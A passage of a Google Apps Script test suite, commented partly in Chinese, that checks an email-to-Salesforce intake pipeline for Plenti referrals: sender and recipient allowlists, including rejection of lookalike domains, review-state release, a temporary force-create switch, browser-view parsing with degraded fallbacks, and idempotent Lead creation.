  ['lookalike-domain','done',false,/not a verified Plenti sender/],
  ['suffix-domain','done',false,/not a verified Plenti sender/],
  ['subdomain-sender','done',false,/not a verified Plenti sender/],
  ['header-from-mismatch','done',false,/not a verified Plenti sender/],
  ['original-sender-missing','done',false,/Sender could not be determined/]
 ];
 plTestWithFakeApi_(function(calls){
  cases.forEach(function(c){
   plTestClearState_();
   var s=plProcess_(plTestMessage_(c[0]),false);
   plAssertEq_(s.state,c[1],c[0]+' state');
   plAssertEq_(s.leadCandidate,c[2],c[0]+' leadCandidate');
   plAssert_(c[3].test(s.reason),c[0]+' reason should match '+c[3]+', got: '+s.reason);
  });
  plAssertEq_(plTestPosts_(calls).length,0,'a message with no browser-view link must never create a Lead');
 });

 // 可信邮件的页脚营销话术不得把它变成 promotion(D-010 的漏单路径)
 plTestClearState_();
 plTestWithFakeApi_(function(){
  var s=plProcess_(plTestMessage_('trusted-with-promo-footer'),false);
  plAssert_(s.kind!=='promotion','a trusted referral must never be classified as promotion');
  plAssert_(!/offering products/.test(s.reason),'the promotion refinement must not apply to trusted mail');
 });

 // 幂等:第二次跑直接返回既有状态,不重复处理
 plTestClearState_();
 plTestWithFakeApi_(function(calls){
  var first=plProcess_(plTestMessage_('trusted-referral'),false);
  var before=calls.length;
  var second=plProcess_(plTestMessage_('trusted-referral'),false);
  plAssertEq_(second.reason,first.reason,'second run returns the stored state');
  plAssertEq_(calls.length,before,'second run performs no further calls');
 });

 // 异常一律落 error 并保持可见,不吞掉
 plTestClearState_();
 plTestSetProps_({INTERNAL_DOMAIN:null});
 plTestWithFakeApi_(function(){
  var s=plProcess_(plTestMessage_('trusted-referral'),false);
  plAssertEq_(s.state,'error','a configuration failure lands in error state');
  plAssertEq_(s.leadCandidate,true,'errors stay visible through the Review label');
  plAssertEq_(ivLeadLabelFlags_([s]).review,true,'error state raises the Review label');
 });
 plTestBaseline_();

 console.log('PASS: 11 end-to-end routing cases, promotion guard, idempotency, error visibility');
}

// ============================================================
// 14. review 状态的自动解除(Q9 关闭)
// ============================================================

function testPlentiReviewRelease(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral'),id=message.getId();

 /** 造一条"已建 Lead、仍在 review"的状态,并让查询返回指定的 Lead。 */
 function withLead(lead,fn){
  plTestClearState_();
  ivSave_(id,{state:'review',kind:'referral',created:true,record:'00Qreview0001AAA',
   leadCandidate:true,reason:'New Plenti Lead awaiting administrator approval',date:'2026-09-07T02:15:00.000Z'});
  return plTestWithFakeApi_(function(calls){
   ivQuery_=function(q){calls.push({kind:'query',query:q});return lead?[lead]:[];};
   return fn(calls);
  });
 }

 // ---- 1. 联系方式仍然为空 → 保持 review ----
 withLead({Id:'00Qreview0001AAA',Email:null,Phone:null,MobilePhone:null,Status:'New',IsConverted:false},function(calls){
  plAssertEq_(plRefreshReview_(message),false,'no contact details means the review stays open');
  plAssertEq_(ivGet_(id).state,'review','state unchanged');
  plAssertEq_(calls.length,1,'exactly one lookup');
  plAssert_(/SELECT Id,Email,Phone,MobilePhone,Status,IsConverted/.test(calls[0].query),'a minimal field list is queried, not ivLeadFields_ — cheaper, and it avoids conditional fields like StateCode');
 });

 // ---- 2. 三种联系方式各自都能解除 ----
 [['Phone','0400000001'],['Email','customer@example.net'],['MobilePhone','0400000002']].forEach(function(c){
  var lead={Id:'00Qreview0001AAA',Email:null,Phone:null,MobilePhone:null,Status:'New',IsConverted:false};
  lead[c[0]]=c[1];
  withLead(lead,function(){
   plAssertEq_(plRefreshReview_(message),true,c[0]+' clears the review');
   var after=ivGet_(id);
   plAssertEq_(after.state,'done',c[0]+': state becomes done');
   plAssert_(/Contact details were added or changed by a person/.test(after.reason),c[0]+': the reason says why');
   plAssertEq_(after.created,true,c[0]+': the created flag survives, so SF-Lead-Created stays lit');
   plAssertEq_(after.record,'00Qreview0001AAA',c[0]+': the record id survives');
  });
 });

 // ---- 3. 被转换 / 被判 Unqualified 也算处理过了 ----
 withLead({Id:'00Qreview0001AAA',Status:'New',IsConverted:true},function(){
  plAssertEq_(plRefreshReview_(message),true,'a converted Lead clears');
  plAssert_(/converted/.test(ivGet_(id).reason),'named');
 });
 withLead({Id:'00Qreview0001AAA',Status:'Unqualified',IsConverted:false},function(){
  plAssertEq_(plRefreshReview_(message),true,'an Unqualified Lead clears');
  plAssert_(/Unqualified/.test(ivGet_(id).reason),'named');
 });

 // ---- 4. ⚠️ 成本守卫:没有 Lead 记录的 review 一次查询都不能发 ----
 //     进组之后所有非 Plenti 噪音邮件都会是这种状态(Q10),不能为它们查 Salesforce。
 plTestClearState_();
 ivSave_(id,{state:'review',kind:'review',leadCandidate:true,reason:'not a verified Plenti sender'});
 plTestWithFakeApi_(function(calls){
  plAssertEq_(plRefreshReview_(message),false,'a review with no Lead record does nothing');
  plAssertEq_(calls.length,0,'and issues NO Salesforce query — untrusted noise must not cost API calls');
 });
 plTestClearState_();
 ivSave_(id,{state:'done',created:true,record:'00Qreview0001AAA'});
 plTestWithFakeApi_(function(calls){
  plAssertEq_(plRefreshReview_(message),false,'an already-cleared state is not re-checked');
  plAssertEq_(calls.length,0,'idempotent, and free');
 });
 plTestClearState_();
 plTestWithFakeApi_(function(calls){
  plAssertEq_(plRefreshReview_(message),false,'an unprocessed message does nothing');
  plAssertEq_(calls.length,0,'no query');
 });

 // ---- 5. 查询失败绝不中断主流程 ----
 //     runIntakeV2 的主循环调用这里时没有包 try/catch,抛出去整轮就死了。
 plTestClearState_();
 ivSave_(id,{state:'review',created:true,record:'00Qreview0001AAA',leadCandidate:true,reason:'awaiting'});
 plTestWithFakeApi_(function(){
  ivQuery_=function(){throw new Error('SIMULATED SOQL FAILURE');};
  var threw=false;
  try{plRefreshReview_(message);}catch(e){threw=true;}
  plAssertEq_(threw,false,'a lookup failure must not propagate — it would kill the whole intake run');
  plAssertEq_(ivGet_(id).state,'review','and the state is left untouched');
 });
 withLead(null,function(){
  plAssertEq_(plRefreshReview_(message),false,'a missing Lead leaves the review open');
  plAssertEq_(ivGet_(id).state,'review','state untouched');
 });

 // ---- 6. 标签转换:Created+Review → 只剩 Created ----
 var before=ivLeadLabelFlags_([{kind:'referral',state:'review',created:true,record:'00Qreview0001AAA',leadCandidate:true}]);
 plAssertEq_(before.created,true,'before: SF-Lead-Created is lit');
 plAssertEq_(before.review,true,'before: SF-Lead-Review is lit — 待补联系方式');
 var after=ivLeadLabelFlags_([{kind:'referral',state:'done',created:true,record:'00Qreview0001AAA',leadCandidate:true}]);
 plAssertEq_(after.created,true,'after: SF-Lead-Created stays lit');
 plAssertEq_(after.review,false,'after: SF-Lead-Review goes out — 已补全');
 plAssertEq_(after.updated,false,'SF-Lead-Updated stays dark on the Plenti path (no reply-supplement flow)');

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 24 review-release cases (Q9 closed; no API cost for untrusted noise)');
}

// ============================================================
// 15. R1 收件人白名单
// ============================================================

function testPlentiRecipientAllowlist(){
 plTestBaseline_();
 var entries=plRecipientAllowlist_();

 function withHeaders(headers){
  return plTestMessageFrom_({id:'inline-recipient',subject:'New customer referral',
   date:'2026-09-08T01:00:00.000Z',headers:headers,body:'Referral reference: FIXTURE-0100\n'});
 }

 // 四个头各自都能命中
 plAssertEq_(plRecipientAllowed_(withHeaders({'To':'eDocs <edocs@example.org>'}),entries),true,'To header hit');
 plAssertEq_(plRecipientAllowed_(withHeaders({'Cc':'edocs@example.org'}),entries),true,'Cc header hit');
 plAssertEq_(plRecipientAllowed_(withHeaders({'Delivered-To':'jack.fixture@example.com'}),entries),true,'Delivered-To header hit');
 plAssertEq_(plRecipientAllowed_(withHeaders({'X-Original-To':'edocs@example.org'}),entries),true,'X-Original-To header hit');

 // 一个头里有多个地址,命中在后面
 plAssertEq_(plRecipientAllowed_(withHeaders({'To':'"Someone, Else" <other@elsewhere.example>, eDocs <edocs@example.org>'}),entries),true,'second address in a multi-address header');

 // 大小写不敏感
 plAssertEq_(plRecipientAllowed_(withHeaders({'To':'EDOCS@EXAMPLE.ORG'}),entries),true,'case insensitive');

 // 全不命中
 plAssertEq_(plRecipientAllowed_(withHeaders({'To':'sales@elsewhere.example','Cc':'other@elsewhere.example'}),entries),false,'no allowlisted recipient');
 plAssertEq_(plRecipientAllowed_(withHeaders({}),entries),false,'no recipient headers at all');

 // 白名单也走域名边界匹配,不是子串
 var domainEntries=['@plenti.example'];
 plAssertEq_(plRecipientAllowed_(withHeaders({'To':'x@plenti.example'}),domainEntries),true,'domain entry hit');
 plAssertEq_(plRecipientAllowed_(withHeaders({'To':'x@evil-plenti.example'}),domainEntries),false,'lookalike prefix must not match');
 plAssertEq_(plRecipientAllowed_(withHeaders({'To':'x@plenti.example.attacker.example'}),domainEntries),false,'trusted domain as a prefix must not match');
 plAssertEq_(plRecipientAllowed_(withHeaders({'To':'x@mail.plenti.example'}),domainEntries),false,'subdomain is not automatically allowed');

 // 发件人可信与收件人白名单共用匹配核心,但语义独立,互不影响
 plAssertEq_(plSenderTrusted_('referrals@plenti.example',plTrustedSenders_()),true,'sender trust still works after refactor');
 plAssertEq_(plSenderTrusted_('edocs@example.org',plTrustedSenders_()),false,'an allowlisted recipient is not thereby a trusted sender');

 // 属性缺失即抛错停止 —— 收窄范围的开关缺失时不能变成最宽
 plTestSetProps_({INTAKE_RECIPIENT_ALLOWLIST:null});
 plAssertThrows_(function(){plRecipientAllowlist_();},/INTAKE_RECIPIENT_ALLOWLIST/,'missing allowlist must stop processing');
 plTestSetProps_({INTAKE_RECIPIENT_ALLOWLIST:'  ,  '});
 plAssertThrows_(function(){plRecipientAllowlist_();},/INTAKE_RECIPIENT_ALLOWLIST/,'a list of only separators counts as missing');

 plTestBaseline_();
 console.log('PASS: 15 recipient allowlist cases including domain-boundary bypasses');
}

// ============================================================
// 16. R3 临时强制创建开关 —— ⚠️ Phase 4 后连同被测代码一起删除
// ============================================================

function testPlentiForceCreate(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral');

 // 默认关闭:未配置 = false
 plAssertEq_(plForceCreate_(),false,'PLENTI_FORCE_CREATE defaults to off when unset');
 plTestSetProps_({PLENTI_FORCE_CREATE:'false'});
 plAssertEq_(plForceCreate_(),false,'explicit "false" stays off');
 plTestSetProps_({PLENTI_FORCE_CREATE:'TRUE'});
 plAssertEq_(plForceCreate_(),false,'only the exact lowercase string "true" turns it on');
 plTestSetProps_({PLENTI_FORCE_CREATE:null});

 // 关闭时:置信度判定照旧生效,不建 Lead
 plTestWithFakeApi_(function(calls){
  var s=plProcess_(message,false);
  plAssertEq_(s.state,'review','with the switch off the confidence gate still rejects');
  plAssert_(!s.forced,'no forced marker when the switch is off');
  plAssertEq_(plTestPosts_(calls).length,0,'switch off means no Lead is written');
 });

 // 打开时:绕过置信度门,真正走到 plCreateLead_
 plTestClearState_();
 plTestSetProps_({PLENTI_FORCE_CREATE:'true'});
 var posted=plTestWithFakeApi_(function(calls){
  var s=plProcess_(message,false);
  plAssertEq_(s.created,true,'forced mode reaches Lead creation');
  plAssertEq_(s.forced,true,'the state records that this run was forced');
  plAssert_(/^\[FORCED\] /.test(s.reason),'the reason is prefixed so a reviewer can tell');
  var p=plTestPosts_(calls);
  plAssertEq_(p.length,1,'exactly one Lead POST');
  return p[0].data;
 });

 // 合成值的两条安全约束
 plAssert_(/@example\.invalid$/.test(posted.Email),'the synthetic customer email must use the unroutable .invalid TLD so no Salesforce Flow can mail a real address');
 plAssert_(posted.Email!=='referrals@plenti.example','the synthetic email must never fall back to the sender address');
 plAssert_(/Forced Test/.test(posted.LastName),'the synthetic name is obviously test data');
 plAssertEq_(posted.LeadSource,'Plenti Referrals','the real field mapping is still exercised — that is the point of the switch');
 plAssertEq_(JSON.parse(posted.Plenti_Parsed_JSON__c).receivedAt,message.getDate().toISOString(),'the received timestamp is still the real message date, now carried in the parsed JSON');

 // 解析器保持诚实:强制模式不改 parsePlentiReferral_ 的返回
 var honest=parsePlentiReferral_(message);
 plAssertEq_(honest.kind,'unknown','the parser must not lie about what it parsed, even in forced mode');
 plAssertEq_(honest.confidence,'low','confidence stays low');

 // 合成结果保留真实解析到的值,只补空缺
 var partial={kind:'unknown',referralId:'REAL-123',customer:{firstName:'',lastName:'Realname',email:'',phone:'0400000000',street:'',city:'',state:'',postcode:''},confidence:'low',missing:[],ambiguous:[],reason:''};
 var filled=plForcedParse_(message,partial);
 plAssertEq_(filled.referralId,'REAL-123','a real referral id is preserved');
 plAssertEq_(filled.customer.lastName,'Realname','a real name is preserved');
 plAssertEq_(filled.customer.phone,'0400000000','a real phone is preserved');
 plAssert_(/@example\.invalid$/.test(filled.customer.email),'only the missing field is synthesised');

 // 前后两层去重仍然有效。
 // 顺序要紧:防重锁的用例必须紧接在上面那次真实创建之后跑 —— 那次创建留下的
 // IV2_CREATE_ 正是它的前置条件,先 plTestClearState_() 会把前置条件清掉。
 plTestWithFakeApi_(function(calls){
  plAssertThrows_(function(){plCreateLead_(message,plForcedParse_(message,parsePlentiReferral_(message)));},
   /Earlier create outcome is uncertain/,'the IV2_CREATE_ lock still applies in forced mode');
  plAssertEq_(plTestPosts_(calls).length,0,'the blocked retry writes nothing');
 });
 plTestClearState_();
 plTestWithFakeApi_(function(calls){
  ivQuery_=function(q){calls.push({kind:'query',query:q});return [{Id:'00Qexisting00001AAA',Description:'[Intake: '+message.getId()+']',IsConverted:false,Status:'New'}];};
  var r=plResolve_(message,plForcedParse_(message,parsePlentiReferral_(message)),true);
  plAssert_(r.lead&&!r.create,'forced mode still honours the message-marker layer');
  plAssertEq_(plTestPosts_(calls).length,0,'a second run of the same message must not create a second Lead');
 });

 plTestSetProps_({PLENTI_FORCE_CREATE:null});
 plTestBaseline_();
 console.log('PASS: 18 force-create switch cases (TEMPORARY — remove with D-017 after Phase 4)');
}

// ============================================================
// 17. R7 正文取值与清洗占位
// ============================================================

function testPlentiMessageBody(){
 plTestBaseline_();

 // 有纯文本版 → 用纯文本,不碰 HTML
 var plain=plMessageBody_(plTestMessageFrom_({id:'body-plain',subject:'s',headers:{},
  body:'Referral reference: FIXTURE-0200\nCustomer: Dale Example\n',html:'<p>should not be used</p>'}));
 plAssertEq_(plain.isHtml,false,'plain text is preferred');
 plAssert_(plain.text.indexOf('FIXTURE-0200')>=0,'plain body content');
 plAssert_(plain.text.indexOf('<p>')<0,'the HTML version must not leak in when plain text exists');

 // 纯文本为空 → 回落 HTML,标签**原样保留不剥**
 var html=plMessageBody_(plTestMessageFrom_({id:'body-html',subject:'s',headers:{},
  body:'',html:'<table><tr><td>Reference</td><td>FIXTURE-0201</td></tr></table>'}));
 plAssertEq_(html.isHtml,true,'falls back to HTML when getPlainBody() is empty');
 plAssert_(html.text.indexOf('<table>')>=0,'HTML tags are kept verbatim — no stripping this round');
 plAssert_(html.text.indexOf('FIXTURE-0201')>=0,'HTML fallback carries the content');

 // 两者都空
 var empty=plMessageBody_(plTestMessageFrom_({id:'body-empty',subject:'s',headers:{},body:'',html:''}));
 plAssertEq_(empty.text,'','an empty message yields an empty body');

 // 清洗占位现在必须是纯透传 —— 任何加工都是在没见过真实邮件时瞎猜
 plAssertEq_(plCleanBody_('  raw <b>text</b>  ',false),'  raw <b>text</b>  ','plCleanBody_ must pass through untouched for now');
 plAssertEq_(plCleanBody_('<p>x</p>',true),'<p>x</p>','no HTML stripping this round');

 // 命中的收件人地址要能取出来,不只是布尔
 var entries=plRecipientAllowlist_();
 var m=plTestMessageFrom_({id:'recip',subject:'s',headers:{'To':'other@elsewhere.example, eDocs <edocs@example.org>'},body:'x'});
 plAssertEq_(plMatchedRecipient_(m,entries),'edocs@example.org','the matched address is returned, not just true');
 plAssertEq_(plRecipientAllowed_(m,entries),true,'the boolean wrapper still works');
 plAssertEq_(plMatchedRecipient_(plTestMessageFrom_({id:'no',subject:'s',headers:{'To':'nobody@elsewhere.example'},body:'x'}),entries),'','no match returns an empty string');

 // detail 出参:解析结果给日志用,但**不得**进入落盘的 state
 plTestClearState_();
 plTestWithFakeApi_(function(){
  var detail={},state=plProcess_(plTestMessage_('trusted-referral'),false,detail);
  plAssert_(detail.parsed,'plProcess_ fills the detail out-parameter');
  plAssertEq_(detail.parsed.kind,'unknown','detail carries the honest parse result');
  plAssertEq_(detail.trusted,true,'detail records the trust decision');
  plAssert_(!('parsed' in state),'the parse result must not be persisted into state — Script Properties has a 500KB cap');
  var saved=JSON.parse(PropertiesService.getScriptProperties().getProperty('IV2_MSG_'+plTestMessage_('trusted-referral').getId()));
  plAssert_(!('parsed' in saved),'the saved state stays small');
 });

 plTestBaseline_();
 console.log('PASS: 14 message-body and detail out-parameter cases');
}

// ============================================================
// 18. R8 Browser view —— 链接提取、页面解析、降级路径
// ============================================================

function testPlentiBrowserView(){
 plTestBaseline_();
 var linked=plTestMessage_('trusted-referral-with-link');
 var token=plTestBrowserToken_(),url='https://e.customeriomail.com/deliveries/'+token;

 // ---- 1. 链接提取:纯文本版和 HTML 版都要能提 ----
 plAssertEq_(plBrowserViewUrl_(linked),url,'the link is extracted from the plain-text body');
 var htmlOnly=plTestMessageFrom_({id:'link-html-only',subject:'s',headers:{},body:'',
  html:'<p><a href="'+url+'">View in Browser</a></p>'});
 plAssertEq_(plBrowserViewUrl_(htmlOnly),url,'the link is extracted from the HTML body when there is no plain text');
 var entity=plTestMessageFrom_({id:'link-entity',subject:'s',headers:{},body:'',
  html:'<a href="https://e.customeriomail.com/deliveries/AB&amp;cd==">x</a>'});
 plAssert_(plBrowserViewUrl_(entity).indexOf('&amp;')<0,'HTML entities in the href are unescaped before matching');
 plAssertEq_(plBrowserViewUrl_(plTestMessage_('trusted-referral')),'','a message with no link yields an empty URL');
 // 尾随标点不能被吞进 token
 plAssertEq_(plDeliveryToken_('https://e.customeriomail.com/deliveries/'+token),token,'the delivery token is the last path segment');
 plAssertEq_(plDeliveryToken_('https://example.com/other'),'','a non-delivery URL has no token');

 // ---- 2. 页面解析:必须取第一组的真值,不能取第二组的空值 ----
 var fields=plParseBrowserView_(plTestBrowserHtml_());
 plAssertEq_(fields.name,'Fixture Example','customer name comes from the populated block');
 plAssertEq_(fields.systems,'Battery, Solar','renewable systems parsed');
 plAssertEq_(fields.found.length,4,'all four labelled fields are found');
 plAssertEq_(fields.phone,'0400 000 111','customer phone comes from the populated block, verbatim — the empty duplicate block must not win');
 plAssertEq_(fields.missing.length,0,'nothing missing');
 // 地址:<br/> 与换行都要合并成一行
 plAssertEq_(fields.address,'12 Fictional Street, Sampletown SA 5000','the address is merged onto one line');
 plAssert_(fields.address.indexOf('\n')<0,'no newline survives in the address');
 plAssert_(fields.address.indexOf('<br')<0,'no markup survives in the address');

 // 第二组的空值绝不能被选中
 plAssert_(fields.name!=='','the empty duplicate block must not win');
 plAssert_(fields.systems!=='[]','the literal [] placeholder is treated as empty, not as a value');

 // 只有空值区块时,三个字段都应为空而不是 []
 var emptyOnly=plParseBrowserView_(
  '<p><strong>Customer name</strong></p><p></p>'+
  '<p><strong>Customer phone</strong></p><p></p>'+
  '<p><strong>Customer address</strong></p><p></p>'+
  '<p><strong>Renewable systems</strong></p><p>[]</p>');
 plAssertEq_(emptyOnly.name,'','an empty block yields no name');
 plAssertEq_(emptyOnly.systems,'','[] is not a value');
 plAssertEq_(emptyOnly.phone,'','an empty phone block yields no phone');
 plAssertEq_(emptyOnly.missing.length,4,'all four are reported missing');

 // ---- 3. 地址拆分:匹配不上就整串塞 Street,不猜 ----
 var au=plSplitAuAddress_('12 Fictional Street, Sampletown SA 5000');
 plAssertEq_(au.street,'12 Fictional Street','street');
 plAssertEq_(au.city,'Sampletown','city');
 plAssertEq_(au.state,'SA','state');
 plAssertEq_(au.postcode,'5000','postcode');
 var odd=plSplitAuAddress_('Somewhere unusual without a postcode');
 plAssertEq_(odd.street,'Somewhere unusual without a postcode','an unrecognised format goes into Street whole');
 plAssertEq_(odd.city,'','nothing is guessed when the pattern does not hold');
 plAssertEq_(odd.state,'','no state is invented');

 // ---- 4. 抓取成功:字段合并进 parsed,身份来自 token ----
 plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(fetched){
  var parsed=parsePlentiReferral_(linked),result=plEnrichFromBrowserView_(linked,parsed);
  plAssertEq_(fetched.length,1,'exactly one fetch');
  plAssertEq_(fetched[0].options.muteHttpExceptions,true,'HTTP errors must not throw out of the fetch');
  plAssertEq_(parsed.kind,'referral','a delivery token identifies the message as a referral');
  plAssertEq_(parsed.referralId,token,'the delivery token becomes the referral id');
  plAssertEq_(parsed.confidence,'high','fields parsed means high confidence');
  plAssertEq_(parsed.customer.lastName,'Fixture Example','the customer name comes from the page, not the email');
  plAssertEq_(parsed.customer.street,'12 Fictional Street','address split into Street');
  plAssertEq_(parsed.customer.state,'SA','address split into StateCode');
  plAssertEq_(parsed.systems,'Battery, Solar','renewable systems recorded');
  plAssertEq_(result.html,plTestBrowserHtml_(),'the raw page is returned for audit storage');
  plAssert_(!parsed.browserView.degraded,'not degraded');
  plAssert_(/^\d{4}-\d{2}-\d{2}T/.test(parsed.browserView.fetchedAt),'the fetch timestamp is recorded — these links may expire');
  plAssert_(JSON.stringify(parsed).indexOf('Fixture Example')>=0,'the parsed JSON carries the customer data');
  plAssert_(JSON.stringify(parsed).indexOf('<p style')<0,'the page HTML must not be embedded in the parsed JSON');
 });

 // ---- 5. 降级:抓取失败仍然要能建 Lead(SLA 时钟不等人)----
 var failures=[
  ['HTTP 404',function(){return {code:404,text:'not found'};},/HTTP 404/],
  ['network error',function(){return null;},/SIMULATED NETWORK FAILURE/],
  ['empty body',function(){return {code:200,text:''};},/empty body/]
 ];
 failures.forEach(function(c){
  plTestWithFetch_(c[1],function(){
   var parsed=parsePlentiReferral_(linked),result=plEnrichFromBrowserView_(linked,parsed);
   plAssertEq_(parsed.kind,'referral',c[0]+': identity still comes from the token');
   plAssertEq_(parsed.referralId,token,c[0]+': the token survives a failed fetch');
   plAssertEq_(parsed.confidence,'low',c[0]+': degraded confidence');
   plAssertEq_(parsed.browserView.degraded,true,c[0]+': marked degraded');
   plAssert_(c[2].test(parsed.browserView.error),c[0]+': the reason is recorded, got '+parsed.browserView.error);
   plAssertEq_(result.html,'',c[0]+': no page to store');
   plAssert_(/open the link manually/.test(parsed.reason),c[0]+': the reason tells a human what to do');
  });
 });

 // 没有链接 → 不抓取,也不建 Lead(身份不确定)
 plTestWithFetch_(function(){throw new Error('must not fetch without a link');},function(fetched){
  var parsed=parsePlentiReferral_(plTestMessage_('trusted-referral'));
  plEnrichFromBrowserView_(plTestMessage_('trusted-referral'),parsed);
  plAssertEq_(fetched.length,0,'no link means no network call at all');
  plAssertEq_(parsed.kind,'unknown','without a token the message is not identifiable as a referral');
 });

 // ---- 6. 端到端:抓取成功 → 真的建出 Lead ----
 plTestClearState_();
 plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
  plTestWithFakeApi_(function(calls){
   ivQuery_=function(q){calls.push({kind:'query',query:q});
    if(/WHERE Id='/.test(q))return [{Id:'00Qfixture000001AAA'}];
    return [];};
   var state=plProcess_(linked,false);
   plAssertEq_(state.created,true,'a fetched referral creates a Lead');
   // [Q18] 干净建出 → done;Review 不亮,"待补联系方式"交给 SF List View(D-033)
   plAssertEq_(state.state,'done','[Q18] a cleanly created referral goes straight to done');
   plAssertEq_(ivLeadLabelFlags_([state]).review,false,'[Q18] and lights no Review label');
   plAssertEq_(ivLeadLabelFlags_([state]).created,true,'but Created still lights');
   var posts=plTestPosts_(calls);
   plAssertEq_(posts.length,1,'exactly one Lead POST');
   plAssertEq_(posts[0].data.Plenti_Lead_ID__c,token,'the delivery token is stored as the external id');
   plAssertEq_(posts[0].data.LastName,'Fixture Example','the customer name came from the browser view');
   plAssertEq_(posts[0].data.Plenti_Browser_View_HTML__c,plTestBrowserHtml_(),'the page is stored for audit');
   plAssert_(!('Email' in posts[0].data),'Plenti never supplies a customer email — the field stays absent');
  });
 });

 // ---- 7. 端到端降级:抓取失败照样建 Lead ----
 plTestClearState_();
 plTestWithFetch_(function(){return {code:503,text:'busy'};},function(){
  plTestWithFakeApi_(function(calls){
   ivQuery_=function(q){calls.push({kind:'query',query:q});
    if(/WHERE Id='/.test(q))return [{Id:'00Qfixture000002AAA'}];
    return [];};
   var state=plProcess_(linked,false);
   plAssertEq_(state.created,true,'a failed fetch must NOT stop the Lead from being created — the SLA clock is running');
   plAssert_(/\[DEGRADED\]/.test(state.reason),'the state says the Lead is degraded');
   plAssertEq_(state.state,'review','[Q18] a degraded Lead is an exception — it needs a human, so review');
   plAssertEq_(ivLeadLabelFlags_([state]).review,true,'[Q18] and Review lights');
   var posts=plTestPosts_(calls);
   plAssertEq_(posts.length,1,'still exactly one Lead');
   plAssertEq_(posts[0].data.Plenti_Lead_ID__c,token,'identity is preserved even when the page could not be read');
   plAssert_(/CUSTOMER DETAILS MISSING/.test(posts[0].data.Description),'Description tells the reviewer to open the link');
   plAssertEq_(posts[0].data.Plenti_Browser_View_HTML__c,'','no page stored');
  });
 });

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: 48 browser-view cases (link extraction, page parsing, degradation, end-to-end)');
}

// ============================================================
// 19. R9 离线注入测试入口 —— ⚠️ Phase 4 后连同被测代码一起删除
// ============================================================

function testPlentiTestEntryPoint(){
 plTestBaseline_();
 var linked=plTestMessage_('trusted-referral-with-link'),id=linked.getId();
 var token=plTestBrowserToken_();
 // fixture 的 To 头是 edocs@example.org,在基线白名单里
 var inbox={};inbox[id]=linked;

 // ---- 1. 两道安全开关照常生效,这个入口不绕过 ----
 plTestSetProps_({INTAKE_V2_ENABLED:null,EDOCS_ADAPTATION_VALIDATED:null});
 plTestWithGmail_(inbox,function(){
  plAssertEq_(plTestFromMessageId(id),null,'the test entry point respects INTAKE_V2_ENABLED');
 });
 plTestSetProps_({INTAKE_V2_ENABLED:'true'});
 plTestWithGmail_(inbox,function(){
  plAssertThrows_(function(){plTestFromMessageId(id);},/has not been validated/,'the second safety switch still applies');
 });
 plTestSetProps_({EDOCS_ADAPTATION_VALIDATED:'true'});

 // ---- 2. 白名单未命中 → 什么都不做,不写状态 ----
 plTestClearState_();
 var outsider=plTestMessageFrom_({id:'r9-outsider',subject:'x',date:'2026-09-09T03:00:00.000Z',
  headers:{'To':'someone@elsewhere.example'},body:'x'});
 var box2={};box2['r9-outsider']=outsider;
 plTestWithGmail_(box2,function(){
  plAssertEq_(plTestFromMessageId('r9-outsider'),null,'an out-of-scope message is not processed');
 });
 plAssert_(!PropertiesService.getScriptProperties().getProperty('IV2_MSG_r9-outsider'),'no state is written for an out-of-scope message');

 // ---- 3. 未知消息 ID → 明确报错,不静默 ----
 plTestWithGmail_({},function(){
  plAssertThrows_(function(){plTestFromMessageId('does-not-exist');},/No Gmail message found/,'an unknown id fails loudly');
  plAssertThrows_(function(){plTestFromMessageId('');},/needs a Gmail message id/,'an empty id fails loudly');
 });

 // ---- 4. 完整链路:抓取成功 → 建 Lead → 写两张 Sheet ----
 plTestClearState_();
 plTestSetProps_({INTAKE_LOG_SHEET_ID:'fixture-sheet'});
 plTestWithGmail_(inbox,function(){
  plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
   plTestWithSheet_(function(sheets){
    plTestWithFakeApi_(function(calls){
     ivQuery_=function(q){calls.push({kind:'query',query:q});
      if(/WHERE Id='/.test(q))return [{Id:'00Qr9000000001AAA'}];
      return [];};
     var state=plTestFromMessageId(id);
     plAssertEq_(state.created,true,'the full pipeline creates a Lead');
     var posts=plTestPosts_(calls);
     plAssertEq_(posts.length,1,'exactly one Lead POST');
     plAssertEq_(posts[0].data.Plenti_Lead_ID__c,token,'the delivery token reached Salesforce');
     plAssertEq_(posts[0].data.LastName,'Fixture Example','customer data came from the browser view');
     // Sheet:汇总页表头+一行,Messages 页表头+一行
     plAssertEq_(sheets.summary.length,2,'the run-summary tab got a header and one row');
     plAssertEq_(sheets.messages.length,2,'the Messages tab got a header and one row');
     plAssertEq_(sheets.summary[1][2],1,'one message processed');
     plAssertEq_(sheets.summary[1][3],1,'one Lead created');
     plAssertEq_(sheets.messages[1][2],id,'the message row records the Gmail id');
     plAssertEq_(sheets.messages[1][6],'created','final state is recorded as created');
    });
   });
  });
 });

 // ---- 4b. 不带 force 重跑 → 短路,本轮什么都没做,不能重复记账 ----
 //      以前这里会把上一轮持久化的 createdNow 再记一次进 Sheet,月度对账会多算。
 plTestWithGmail_(inbox,function(){
  plTestWithFetch_(function(){throw new Error('must not fetch when short-circuiting');},function(fetched){
   plTestWithSheet_(function(sheets){
    plTestWithFakeApi_(function(calls){
     var again=plTestFromMessageId(id);
     plAssertEq_(again.record,'00Qr9000000001AAA','the stored state is returned unchanged');
     plAssertEq_(fetched.length,0,'a short-circuited run must not fetch the browser view');
     plAssertEq_(plTestPosts_(calls).length,0,'and must not write to Salesforce');
     plAssertEq_(sheets.summary[1][2],0,'processed is logged as 0 — nothing was processed this run');
     plAssertEq_(sheets.summary[1][3],0,'and created as 0, even though the stored state still carries createdNow');
    });
   });
  });
 });

 // ---- 5. 幂等:重跑不会建第二个 Lead ----
 plTestWithGmail_(inbox,function(){
  plTestWithFetch_(function(){return {code:200,text:plTestBrowserHtml_()};},function(){
   plTestWithFakeApi_(function(calls){
    // Description 带本邮件 marker —— 这才是"同一封邮件重跑"的真实形态
    ivQuery_=function(q){calls.push({kind:'query',query:q});
     if(/Plenti_Lead_ID__c/.test(q))return [{Id:'00Qr9000000001AAA',Description:'[Intake: '+id+'] ...',IsConverted:false,Status:'New'}];
     if(/WHERE Id='/.test(q))return [{Id:'00Qr9000000001AAA'}];
     return [];};
    var again=plTestFromMessageId(id,true);
